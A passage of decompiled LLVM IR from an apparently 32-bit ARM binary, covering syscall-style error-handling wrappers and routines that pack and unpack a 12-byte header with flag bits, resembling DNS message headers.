  store i32 %v0_17304, i32* %v7_17304, align 4
  %v0_17308 = load i32, i32* @r5, align 4
  %v1_17308 = add i32 %v0_17308, 4
  store i32 %v1_17308, i32* @r5, align 4
  %v0_1730c = load i32, i32* %r0.global-to-local, align 4
  %v1_1730c = add i32 %v0_1730c, 1
  store i32 %v1_1730c, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp38 = icmp eq i32 %v1_1730c, 0
  br i1 %tmp38, label %dec_label_pc_17304, label %dec_label_pc_1731c

dec_label_pc_1731c:                               ; preds = %dec_label_pc_17304
  %v3_1731c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1731c, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_17324 = icmp eq i32 %v3_1731c, 0
  %v1_17328 = load i32, i32* @r6, align 4
  %v5_17328 = mul i32 %v1_1730c, 4
  %v6_17328 = add i32 %v1_17328, %v5_17328
  %v7_17328 = inttoptr i32 %v6_17328 to i32*
  store i32 0, i32* %v7_17328, align 4
  br i1 %v2_17324, label %dec_label_pc_17358, label %dec_label_pc_17330

dec_label_pc_17330:                               ; preds = %dec_label_pc_1731c
  %v0_17330 = load i32, i32* @r4, align 4
  store i32 %v0_17330, i32* @r0, align 4
  %v0_17334 = call i32 @function_f2e0()
  store i32 %v0_17334, i32* %r0.global-to-local, align 4
  %v0_17338 = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_17338, %v0_17334
  br i1 %tmp, label %dec_label_pc_17340, label %dec_label_pc_17358

dec_label_pc_17340:                               ; preds = %dec_label_pc_17330
  %v0_17340 = load i32, i32* @r4, align 4
  store i32 %v0_17340, i32* @r1, align 4
  %v0_17344 = load i32, i32* @r5, align 4
  store i32 %v0_17344, i32* %r0.global-to-local, align 4
  %v2_17348 = inttoptr i32 %v0_17344 to i8*
  %v3_17348 = call i32 @function_f53c(i8* %v2_17348, i32 %v0_17340)
  store i32 %v3_17348, i32* %r0.global-to-local, align 4
  %v0_1734c = load i32, i32* @r5, align 4
  br label %dec_label_pc_17358

dec_label_pc_17358:                               ; preds = %dec_label_pc_17330, %dec_label_pc_1731c, %dec_label_pc_17340
  %storemerge1 = phi i32 [ %v0_1734c, %dec_label_pc_17340 ], [ %v0_170d4, %dec_label_pc_17330 ], [ %v0_170d4, %dec_label_pc_1731c ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1735c = load i32, i32* @r7, align 4
  %v2_1735c = add i32 %v1_1735c, 8
  %v3_1735c = inttoptr i32 %v2_1735c to i32*
  store i32 2, i32* %v3_1735c, align 4
  %v0_17360 = load i32, i32* %r2.global-to-local, align 4
  %v2_17360 = mul i32 %v0_17360, 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_17368 = load i32, i32* @r7, align 4
  %v2_17368 = add i32 %v1_17368, 12
  %v3_17368 = inttoptr i32 %v2_17368 to i32*
  store i32 %v2_17360, i32* %v3_17368, align 4
  %v3_1736c = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1736c, i32* @ip, align 4
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v0_17374 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_17374, i32* @r5, align 4
  %v0_17378 = load i32, i32* @r7, align 4
  %v2_17378 = inttoptr i32 %v3_1736c to i32*
  store i32 %v0_17378, i32* %v2_17378, align 4
  %v0_1737c = load i32, i32* @r7, align 4
  %v1_1737c = inttoptr i32 %v0_1737c to i32*
  %v2_1737c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1737c, i32* %v1_1737c, align 4
  %v3_1737c = add i32 %v0_1737c, 4
  %v4_1737c = inttoptr i32 %v3_1737c to i32*
  %v5_1737c = load i32, i32* @fp, align 4
  store i32 %v5_1737c, i32* %v4_1737c, align 4
  %v0_17380 = load i32, i32* @r6, align 4
  %v1_17380 = load i32, i32* @r7, align 4
  %v2_17380 = add i32 %v1_17380, 16
  %v3_17380 = inttoptr i32 %v2_17380 to i32*
  store i32 %v0_17380, i32* %v3_17380, align 4
  %v0_17384 = load i32, i32* %r3.global-to-local, align 4
  %v1_17384 = load i32, i32* %r2.global-to-local, align 4
  %v2_17384 = inttoptr i32 %v1_17384 to i32*
  store i32 %v0_17384, i32* %v2_17384, align 4
  br label %dec_label_pc_1739c

dec_label_pc_1738c:                               ; preds = %dec_label_pc_172a8
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %v1_17140, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_1739c

dec_label_pc_1739c:                               ; preds = %bb37, %dec_label_pc_17358, %dec_label_pc_1738c
  %v3_1739c = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1739c, i32* @r0, align 4
  %v0_173a0 = call i32 @function_108e4()
  %v3_173a4 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_173a4, i32* @r0, align 4
  %v0_173a8 = call i32 @function_108e4()
  store i32 %v0_173a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_173b4

dec_label_pc_173b0:                               ; preds = %dec_label_pc_17188, %dec_label_pc_171ac
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_173b4

dec_label_pc_173b4:                               ; preds = %.thread, %bb, %bb34, %.thread7, %dec_label_pc_17174, %dec_label_pc_17154, %dec_label_pc_1739c, %dec_label_pc_17210, %dec_label_pc_173b0
  %v0_173b4 = load i32, i32* @r5, align 4
  store i32 %v0_173b4, i32* %r0.global-to-local, align 4
  ret i32 %v0_173b4

; uselistorder directives
  uselistorder i32 %v1_1730c, { 1, 0, 2 }
  uselistorder i32 %v1_17308, { 1, 0 }
  uselistorder i32 %v0_172d8, { 1, 0, 2 }
  uselistorder i32 %v2_172cc, { 1, 0 }
  uselistorder i32 %v1_171cc, { 2, 1, 0 }
  uselistorder i32 %v1_171c0, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_17140, { 2, 0, 1, 3 }
  uselistorder i32 %v0_170e0, { 1, 0 }
  uselistorder i32 %v0_170d4, { 1, 2, 3, 5, 4, 0, 6, 8, 7 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp18, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp12, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 21, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 18, 17, 19, 20 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 17, 18, 3, 2, 4, 5, 15, 16, 7, 6, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32 ()* @function_108e4, { 21, 20, 19, 18, 17, 16, 11, 10, 9, 8, 7, 15, 14, 13, 12, 6, 5, 4, 3, 22, 31, 30, 29, 1, 0, 25, 24, 28, 27, 26, 23, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_17080, { 1, 0 }
  uselistorder label %dec_label_pc_173b4, { 8, 6, 0, 3, 7, 4, 5, 2, 1 }
  uselistorder label %dec_label_pc_173b0, { 1, 0 }
  uselistorder label %dec_label_pc_1739c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17358, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17188, { 2, 0, 1 }
}

define i32 @function_173c4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_173c4:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_173c4 = load i32, i32* @r7, align 4
  store i32 %v3_173c4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_173ec, label %dec_label_pc_173dc

dec_label_pc_173dc:                               ; preds = %dec_label_pc_173c4
  %v0_173dc = call i32 @function_ce08()
  %v0_173e0 = load i32, i32* %r7.global-to-local, align 4
  %v1_173e0 = sub i32 0, %v0_173e0
  %v2_173e4 = inttoptr i32 %v0_173dc to i32*
  store i32 %v1_173e0, i32* %v2_173e4, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_173f0.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_173ec

dec_label_pc_173ec:                               ; preds = %dec_label_pc_173c4, %dec_label_pc_173dc
  %v2_173f0 = phi i32 [ %v3_173c4, %dec_label_pc_173c4 ], [ %v2_173f0.pre, %dec_label_pc_173dc ]
  %v0_173ec = phi i32 [ %arg1, %dec_label_pc_173c4 ], [ -1, %dec_label_pc_173dc ]
  store i32 %v2_173f0, i32* %r7.global-to-local, align 4
  ret i32 %v0_173ec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_173ec, { 1, 0 }
}

define i32 @function_173fc(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_173fc:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_173fc = load i32, i32* @r7, align 4
  store i32 %v3_173fc, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17424, label %dec_label_pc_17414

dec_label_pc_17414:                               ; preds = %dec_label_pc_173fc
  %v0_17414 = call i32 @function_ce08()
  %v0_17418 = load i32, i32* %r7.global-to-local, align 4
  %v1_17418 = sub i32 0, %v0_17418
  %v2_1741c = inttoptr i32 %v0_17414 to i32*
  store i32 %v1_17418, i32* %v2_1741c, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_17428.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_17424

dec_label_pc_17424:                               ; preds = %dec_label_pc_173fc, %dec_label_pc_17414
  %v2_17428 = phi i32 [ %v3_173fc, %dec_label_pc_173fc ], [ %v2_17428.pre, %dec_label_pc_17414 ]
  %v0_17424 = phi i32 [ %arg1, %dec_label_pc_173fc ], [ -1, %dec_label_pc_17414 ]
  store i32 %v2_17428, i32* @r7, align 4
  ret i32 %v0_17424

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17424, { 1, 0 }
}

define i32 @function_17430(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17430:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_1743c = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1744c = call i32 @function_179e4(i32 %v2_1743c)
  %v7_17450 = icmp eq i32 %v1_1744c, -1
  br i1 %v7_17450, label %bb, label %dec_label_pc_1745c

bb:                                               ; preds = %dec_label_pc_17430
  store i32 %v1_1744c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17498

dec_label_pc_1745c:                               ; preds = %dec_label_pc_17430
  %v2_1745c = ptrtoint i32* %stack_var_-341 to i32
  store i32 %v2_1745c, i32* @r0, align 4
  %v0_17464 = call i32 @function_f2e0()
  %v1_17468 = add i32 %v0_17464, 1
  %v1_1746c = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_17468, %v1_1746c
  br i1 %tmp, label %dec_label_pc_17474, label %dec_label_pc_17488

dec_label_pc_17474:                               ; preds = %dec_label_pc_1745c
  %v0_17474 = call i32 @function_ce08()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_17480 = inttoptr i32 %v0_17474 to i32*
  store i32 22, i32* %v2_17480, align 4
  %v0_17498.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17498

dec_label_pc_17488:                               ; preds = %dec_label_pc_1745c
  %v0_17488 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v2_1745c, i32* @r1, align 4
  %v2_17490 = inttoptr i32 %v0_17488 to i8*
  %v3_17490 = call i32 @function_f53c(i8* %v2_17490, i32 %v2_1745c)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17498

dec_label_pc_17498:                               ; preds = %bb, %dec_label_pc_17474, %dec_label_pc_17488
  %v0_17498 = phi i32 [ %v1_1744c, %bb ], [ %v0_17498.pre, %dec_label_pc_17474 ], [ 0, %dec_label_pc_17488 ]
  ret i32 %v0_17498

; uselistorder directives
  uselistorder i32 %v2_1745c, { 1, 0, 2 }
  uselistorder i32 %v1_1744c, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @function_f53c, { 8, 9, 10, 0, 1, 2, 3, 4, 5, 6, 7, 11, 12 }
  uselistorder i32 22, { 1, 14, 2, 3, 15, 4, 5, 6, 7, 13, 8, 16, 9, 0, 17, 10, 11, 12 }
  uselistorder label %dec_label_pc_17498, { 2, 1, 0 }
}

define i32 @function_174a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_174a8:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_174a8 = load i32, i32* @r7, align 4
  store i32 %v3_174a8, i32* %stack_var_-8, align 4
  %v0_174b4 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_174b4, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_174b4, -4095
  br i1 %tmp, label %dec_label_pc_174d4, label %dec_label_pc_174c4

dec_label_pc_174c4:                               ; preds = %dec_label_pc_174a8
  %v0_174c4 = call i32 @function_ce08()
  %v0_174c8 = load i32, i32* %r7.global-to-local, align 4
  %v1_174c8 = sub i32 0, %v0_174c8
  %v2_174cc = inttoptr i32 %v0_174c4 to i32*
  store i32 %v1_174c8, i32* %v2_174cc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_174d4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_174d4

dec_label_pc_174d4:                               ; preds = %dec_label_pc_174a8, %dec_label_pc_174c4
  %v1_174d8 = phi i32 [ %v0_174b4, %dec_label_pc_174a8 ], [ -1, %dec_label_pc_174c4 ]
  %v2_174d4 = phi i32 [ %v3_174a8, %dec_label_pc_174a8 ], [ %v2_174d4.pre, %dec_label_pc_174c4 ]
  store i32 %v2_174d4, i32* @r7, align 4
  ret i32 %v1_174d8

; uselistorder directives
  uselistorder i32 %v0_174b4, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_174d4, { 1, 0 }
}

define i32 @function_174dc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_174dc:
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17514, label %dec_label_pc_17500

dec_label_pc_17500:                               ; preds = %dec_label_pc_174dc
  %v0_17500 = call i32 @function_ce08()
  %v0_17504 = load i32, i32* %r7.global-to-local, align 4
  %v1_17504 = sub i32 0, %v0_17504
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1750c = inttoptr i32 %v0_17500 to i32*
  store i32 %v1_17504, i32* %v2_1750c, align 4
  br label %dec_label_pc_17524

dec_label_pc_17514:                               ; preds = %dec_label_pc_174dc
  %v2_17514 = icmp eq i32 %arg1, 0
  br i1 %v2_17514, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_17514
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_17514, %bb
  call void @__pseudo_cond_branch(i1 %v2_17514, i32 ptrtoint (i32* @global_var_1557c.703 to i32))
  br label %dec_label_pc_17524

dec_label_pc_17524:                               ; preds = %dec_label_pc_17500, %.thread
  %v0_17524 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_17524

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17524, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_17534(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_17534:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_17574, label %dec_label_pc_17560

dec_label_pc_17560:                               ; preds = %dec_label_pc_17534
  %v0_17560 = call i32 @function_ce08()
  %v0_17564 = load i32, i32* %r4.global-to-local, align 4
  %v1_17564 = sub i32 0, %v0_17564
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1756c = inttoptr i32 %v0_17560 to i32*
  store i32 %v1_17564, i32* %v2_1756c, align 4
  %v0_1757c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1757c

dec_label_pc_17574:                               ; preds = %dec_label_pc_17534
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_17574 = icmp eq i32 %arg1, 0
  br i1 %v2_17574, label %dec_label_pc_17588, label %dec_label_pc_1757c

dec_label_pc_1757c:                               ; preds = %dec_label_pc_17574, %dec_label_pc_17560
  %v0_1757c = phi i32 [ %arg1, %dec_label_pc_17574 ], [ %v0_1757c.pre, %dec_label_pc_17560 ]
  br label %dec_label_pc_1758c

dec_label_pc_17588:                               ; preds = %dec_label_pc_17574
  br label %dec_label_pc_1758c

dec_label_pc_1758c:                               ; preds = %dec_label_pc_1757c, %dec_label_pc_17588
  %v1_17594 = phi i32 [ %v0_1757c, %dec_label_pc_1757c ], [ %tmp8, %dec_label_pc_17588 ]
  ret i32 %v1_17594

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1758c, { 1, 0 }
}

define i32 @function_17598(i32 %arg1) local_unnamed_addr {
dec_label_pc_17598:
  ret i32 %arg1
}

define i32 @function_175a0(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_175a0:
  %v0_175a0 = load i32, i32* @r0, align 4
  %v1_175a0 = load i32, i32* @r1, align 4
  %v2_175a0 = inttoptr i32 %v0_175a0 to i8*
  %v3_175a0 = call i32 @function_13f80(i8* %v2_175a0, i32 %v1_175a0)
  ret i32 %v3_175a0

; uselistorder directives
  uselistorder i32 (i8*, i32)* @function_13f80, { 1, 2, 0 }
}

define i32 @function_175b0(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_175b0:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_175b4 = load i32, i32* @lr, align 4
  store i32 %v0_175b4, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_175c0 = icmp sgt i32 %arg3, 11
  br i1 %v7_175c0, label %dec_label_pc_175c8, label %dec_label_pc_17694

dec_label_pc_175c8:                               ; preds = %dec_label_pc_175b0
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_175c8 = add i32 %tmp, 1
  %v2_175c8 = inttoptr i32 %v1_175c8 to i8*
  %v3_175c8 = load i8, i8* %v2_175c8, align 1
  store i8 %v3_175c8, i8* %tmp16, align 1
  %v0_175d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_175d0 = inttoptr i32 %v0_175d0 to i32*
  %v2_175d0 = load i32, i32* %v1_175d0, align 4
  %v1_175d4 = trunc i32 %v2_175d0 to i8
  %v4_175d4 = add i32 %arg2, 1
  %v5_175d4 = inttoptr i32 %v4_175d4 to i8*
  store i8 %v1_175d4, i8* %v5_175d4, align 1
  %v0_175d8 = load i32, i32* %ip.global-to-local, align 4
  %v1_175d8 = add i32 %v0_175d8, 8
  %v2_175d8 = inttoptr i32 %v1_175d8 to i32*
  %v3_175d8 = load i32, i32* %v2_175d8, align 4
  %v1_175dc = add i32 %v0_175d8, 20
  %v2_175dc = inttoptr i32 %v1_175dc to i32*
  %v3_175dc = load i32, i32* %v2_175dc, align 4
  %v1_175e0 = add i32 %v0_175d8, 4
  %v2_175e0 = inttoptr i32 %v1_175e0 to i32*
  %v3_175e0 = load i32, i32* %v2_175e0, align 4
  %v1_175e4 = add i32 %v0_175d8, 12
  %v2_175e4 = inttoptr i32 %v1_175e4 to i32*
  %v3_175e4 = load i32, i32* %v2_175e4, align 4
  %v2_175e8 = icmp eq i32 %v3_175dc, 0
  br i1 %v2_175e8, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_175c8
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_175c8, %bb
  %v0_175f8 = phi i32 [ 0, %dec_label_pc_175c8 ], [ 1, %bb ]
  %v1_175f0 = urem i32 %v3_175d8, 16
  %v2_175f4 = icmp eq i32 %v3_175e0, 0
  %v4_175f8 = mul nuw nsw i32 %v1_175f0, 8
  %v5_175f8 = or i32 %v0_175f8, %v4_175f8
  %v1_175fc = add i32 %v0_175d8, 16
  %v2_175fc = inttoptr i32 %v1_175fc to i32*
  %v3_175fc = load i32, i32* %v2_175fc, align 4
  %. = select i1 %v2_175f4, i32 0, i32 128
  %v2_17608 = icmp eq i32 %v3_175e4, 0
  %storemerge11 = select i1 %v2_17608, i32 0, i32 4
  %v2_17614 = or i32 %v5_175f8, %.
  %v2_17618 = icmp eq i32 %v3_175fc, 0
  %.26 = select i1 %v2_17618, i32 0, i32 2
  %v2_17624 = or i32 %v2_17614, %storemerge11
  %v2_17628 = or i32 %v2_17624, %.26
  %v1_1762c = trunc i32 %v2_17628 to i8
  %v2_1762c = load i32, i32* %lr.global-to-local, align 4
  %v3_1762c = add i32 %v2_1762c, 2
  %v4_1762c = inttoptr i32 %v3_1762c to i8*
  store i8 %v1_1762c, i8* %v4_1762c, align 1
  %v0_17630 = load i32, i32* %ip.global-to-local, align 4
  %v1_17630 = add i32 %v0_17630, 24
  %v1_17634 = inttoptr i32 %v1_17630 to i32*
  %v2_17634 = load i32, i32* %v1_17634, align 4
  %v3_17634 = add i32 %v0_17630, 28
  %v4_17634 = inttoptr i32 %v3_17634 to i32*
  %v5_17634 = load i32, i32* %v4_17634, align 4
  %v2_17638 = icmp eq i32 %v2_17634, 0
  %v1_1763c = urem i32 %v5_17634, 16
  %v0_17648 = select i1 %v2_17638, i32 0, i32 128
  %v2_17648 = or i32 %v1_1763c, %v0_17648
  %v1_1764c = trunc i32 %v2_17648 to i8
  %v2_1764c = load i32, i32* %lr.global-to-local, align 4
  %v3_1764c = add i32 %v2_1764c, 3
  %v4_1764c = inttoptr i32 %v3_1764c to i8*
  store i8 %v1_1764c, i8* %v4_1764c, align 1
  %v0_17650 = load i32, i32* %ip.global-to-local, align 4
  %v1_17650 = add i32 %v0_17650, 33
  %v2_17650 = inttoptr i32 %v1_17650 to i8*
  %v3_17650 = load i8, i8* %v2_17650, align 1
  %v2_17654 = load i32, i32* %lr.global-to-local, align 4
  %v3_17654 = add i32 %v2_17654, 4
  %v4_17654 = inttoptr i32 %v3_17654 to i8*
  store i8 %v3_17650, i8* %v4_17654, align 1
  %v0_17658 = load i32, i32* %ip.global-to-local, align 4
  %v1_17658 = add i32 %v0_17658, 32
  %v2_17658 = inttoptr i32 %v1_17658 to i32*
  %v3_17658 = load i32, i32* %v2_17658, align 4
  %v1_1765c = trunc i32 %v3_17658 to i8
  %v2_1765c = load i32, i32* %lr.global-to-local, align 4
  %v3_1765c = add i32 %v2_1765c, 5
  %v4_1765c = inttoptr i32 %v3_1765c to i8*
  store i8 %v1_1765c, i8* %v4_1765c, align 1
  %v0_17660 = load i32, i32* %ip.global-to-local, align 4
  %v1_17660 = add i32 %v0_17660, 37
  %v2_17660 = inttoptr i32 %v1_17660 to i8*
  %v3_17660 = load i8, i8* %v2_17660, align 1
  %v2_17664 = load i32, i32* %lr.global-to-local, align 4
  %v3_17664 = add i32 %v2_17664, 6
  %v4_17664 = inttoptr i32 %v3_17664 to i8*
  store i8 %v3_17660, i8* %v4_17664, align 1
  %v0_17668 = load i32, i32* %ip.global-to-local, align 4
  %v1_17668 = add i32 %v0_17668, 36
  %v2_17668 = inttoptr i32 %v1_17668 to i32*
  %v3_17668 = load i32, i32* %v2_17668, align 4
  %v1_1766c = trunc i32 %v3_17668 to i8
  %v2_1766c = load i32, i32* %lr.global-to-local, align 4
  %v3_1766c = add i32 %v2_1766c, 7
  %v4_1766c = inttoptr i32 %v3_1766c to i8*
  store i8 %v1_1766c, i8* %v4_1766c, align 1
  %v0_17670 = load i32, i32* %ip.global-to-local, align 4
  %v1_17670 = add i32 %v0_17670, 41
  %v2_17670 = inttoptr i32 %v1_17670 to i8*
  %v3_17670 = load i8, i8* %v2_17670, align 1
  %v2_17674 = load i32, i32* %lr.global-to-local, align 4
  %v3_17674 = add i32 %v2_17674, 8
  %v4_17674 = inttoptr i32 %v3_17674 to i8*
  store i8 %v3_17670, i8* %v4_17674, align 1
  %v0_17678 = load i32, i32* %ip.global-to-local, align 4
  %v1_17678 = add i32 %v0_17678, 40
  %v2_17678 = inttoptr i32 %v1_17678 to i32*
  %v3_17678 = load i32, i32* %v2_17678, align 4
  %v1_1767c = trunc i32 %v3_17678 to i8
  %v2_1767c = load i32, i32* %lr.global-to-local, align 4
  %v3_1767c = add i32 %v2_1767c, 9
  %v4_1767c = inttoptr i32 %v3_1767c to i8*
  store i8 %v1_1767c, i8* %v4_1767c, align 1
  %v0_17680 = load i32, i32* %ip.global-to-local, align 4
  %v1_17680 = add i32 %v0_17680, 45
  %v2_17680 = inttoptr i32 %v1_17680 to i8*
  %v3_17680 = load i8, i8* %v2_17680, align 1
  %v2_17684 = load i32, i32* %lr.global-to-local, align 4
  %v3_17684 = add i32 %v2_17684, 10
  %v4_17684 = inttoptr i32 %v3_17684 to i8*
  store i8 %v3_17680, i8* %v4_17684, align 1
  %v0_17688 = load i32, i32* %ip.global-to-local, align 4
  %v1_17688 = add i32 %v0_17688, 44
  %v2_17688 = inttoptr i32 %v1_17688 to i32*
  %v3_17688 = load i32, i32* %v2_17688, align 4
  %v1_1768c = trunc i32 %v3_17688 to i8
  %v2_1768c = load i32, i32* %lr.global-to-local, align 4
  %v3_1768c = add i32 %v2_1768c, 11
  %v4_1768c = inttoptr i32 %v3_1768c to i8*
  store i8 %v1_1768c, i8* %v4_1768c, align 1
  %v2_17694.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_17694

dec_label_pc_17694:                               ; preds = %dec_label_pc_175b0, %bb17
  %v2_17694 = phi i32 [ %v2_17694.pre, %bb17 ], [ %v0_175b4, %dec_label_pc_175b0 ]
  %storemerge = phi i32 [ 12, %bb17 ], [ -1, %dec_label_pc_175b0 ]
  store i32 %v2_17694, i32* @lr, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_175d8, { 0, 2, 1, 3, 4 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 10, 4, 5, 6, 7, 8, 9, 11 }
  uselistorder i32 45, { 1, 2, 0, 3 }
  uselistorder i32 %arg2, { 0, 2, 1 }
  uselistorder label %dec_label_pc_17694, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @function_1769c(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1769c:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_1769c = load i8, i8* %arg1, align 1
  %v4_1769c = zext i8 %v3_1769c to i32
  %v2_176a0 = add i32 %tmp, 1
  %v3_176a0 = inttoptr i32 %v2_176a0 to i8*
  %v4_176a0 = load i8, i8* %v3_176a0, align 1
  %v5_176a0 = zext i8 %v4_176a0 to i32
  %v4_176a4 = mul nuw nsw i32 %v4_1769c, 256
  %v5_176a4 = or i32 %v5_176a0, %v4_176a4
  %v2_176a8 = inttoptr i32 %arg2 to i32*
  store i32 %v5_176a4, i32* %v2_176a8, align 4
  %v2_176ac = add i32 %tmp, 2
  %v3_176ac = inttoptr i32 %v2_176ac to i8*
  %v4_176ac = load i8, i8* %v3_176ac, align 1
  %tmp3 = icmp slt i8 %v4_176ac, 0
  %v3_176b0 = zext i1 %tmp3 to i32
  %v2_176b4 = add i32 %arg2, 4
  %v3_176b4 = inttoptr i32 %v2_176b4 to i32*
  store i32 %v3_176b0, i32* %v3_176b4, align 4
  %v4_176b8 = load i8, i8* %v3_176ac, align 1
  %div = udiv i8 %v4_176b8, 8
  %tmp4 = urem i8 %div, 16
  %v1_176c0 = zext i8 %tmp4 to i32
  %v2_176c4 = add i32 %arg2, 8
  %v3_176c4 = inttoptr i32 %v2_176c4 to i32*
  store i32 %v1_176c0, i32* %v3_176c4, align 4
  %v4_176c8 = load i8, i8* %v3_176ac, align 1
  %div1 = udiv i8 %v4_176c8, 4
  %tmp5 = urem i8 %div1, 2
  %v1_176d0 = zext i8 %tmp5 to i32
  %v2_176d4 = add i32 %arg2, 12
  %v3_176d4 = inttoptr i32 %v2_176d4 to i32*
  store i32 %v1_176d0, i32* %v3_176d4, align 4
  %v4_176d8 = load i8, i8* %v3_176ac, align 1
